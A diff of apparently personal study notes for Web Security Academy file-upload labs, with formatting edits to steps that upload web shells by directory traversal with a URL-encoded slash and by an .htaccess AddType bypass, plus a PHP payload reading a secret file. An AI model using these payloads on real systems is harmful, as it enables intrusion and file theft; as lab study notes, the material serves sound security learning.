@@ -1025,14 +1025,13 @@ Update: python sqlmap.py --update
    - Obfuscate the directory traversal sequence by URL encoding the forward slash (/)
      Content-Disposition: form-data; name="avatar"; filename="`..%2f`exploit.php"   
      Response: The file avatars/../exploit.php has been uploaded.   
-   - Browse the file, Uploaded as /files/avatars/..%2fexploit.php   
-     `https://0ab3005104045836840f2c6600130094.web-security-academy.net/files/exploit.php`
+   - Browse: https://0ab3005104045836840f2c6600130094.web-security-academy.net/files/exploit.php
 4. Web shell upload via **extension blacklist bypass**
-   - Req 1: exploit2.php > AddType application/x-httpd-php .l33t
+   - Req 1: exploit2.php > `AddType application/x-httpd-php .l33t`  
      Content-Disposition: form-data; name="avatar"; **filename=".htaccess"** **Content-Type: text/plain**   
      `AddType application/x-httpd-php .l33t`   
      Response: The file avatars/.htaccess has been uploaded.   
-   - Req 2: exploit.php > <?php echo file_get_contents('/home/carlos/secret'); ?>
+   - Req 2: exploit.php > `<?php echo file_get_contents('/home/carlos/secret'); ?>`  
      Content-Disposition: form-data; name="avatar"; **filename="exploit.l33t"**   
      Content-Type: image/jpeg   
      Response: The file avatars/exploit.l33t has been uploaded.   
